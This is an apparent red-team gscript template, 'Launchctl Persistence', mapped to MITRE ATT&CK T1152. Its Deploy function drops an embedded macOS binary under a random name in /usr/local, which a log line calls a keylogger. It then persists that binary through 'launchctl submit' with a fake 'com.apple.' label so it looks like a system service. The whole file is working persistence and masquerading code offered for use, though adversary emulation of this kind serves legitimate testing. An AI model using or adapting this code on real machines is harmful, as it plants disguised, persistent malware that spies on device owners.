// Example gscript template
// Title: Launchctl Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using Launchctl
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1152

//priority:90
//timeout:150

//go_import:os as os

//import:/private/tmp/example.macho

var labelname;
var binary_args = "";

function Deploy() {
    console.log("Starting execution of Launchctl Persistence");
    // Prep the asset
    var exampBin = GetAssetAsBytes("example.macho");
    if (exampBin[1] != null) {
        console.log("errors: "+exampBin[1].Error());
    }

    // Getting a random name
    //var temppath = os.TempDir();
    var temppath = "/usr/local";
    var naming = G.rand.GetAlphaString(4);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, exampBin[0]);
    console.log("dropped the keylogger binary here: "+name); 
  
    // Persist the sample
    var label = G.rand.GetAlphaString(6);
    label = label.toLowerCase();
    label = "com.apple."+label;
    var exec = G.exec.ExecuteCommand("launchctl", ["submit", "-l", label, "--", name]);
    if (exec[4] == null) {
        console.log("Persisted binary using launchctl, with the label: "+label);
        console.log("Pid: "+exec[0]);;
        console.log("stdout: "+exec[1]);
        console.log("stderr: "+exec[2]);
        console.log("exit code: "+exec[3]);
    } else {
        console.log("go errors: "+exec[4].Error())  ;
    }   
    console.log("Done execution of Launchctl Persistence");
    return true;
}